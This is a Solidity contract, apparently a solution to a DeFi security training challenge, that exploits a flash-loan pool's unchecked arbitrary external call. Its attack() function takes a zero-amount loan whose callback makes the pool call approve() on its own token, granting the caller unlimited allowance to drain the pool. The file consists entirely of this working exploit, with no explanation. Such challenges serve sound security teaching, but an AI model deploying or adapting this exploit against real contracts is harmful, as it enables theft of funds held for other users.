// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterLenderExploit {
    function attack(address _pool, address _token) public {
        ITrusterLenderPool pool = ITrusterLenderPool(_pool);

        bytes memory payload = abi.encodeWithSignature(
            "approve(address,uint256)",
            msg.sender,
            type(uint256).max
        );

        pool.flashLoan(0, address(this), _token, payload);
    }
}
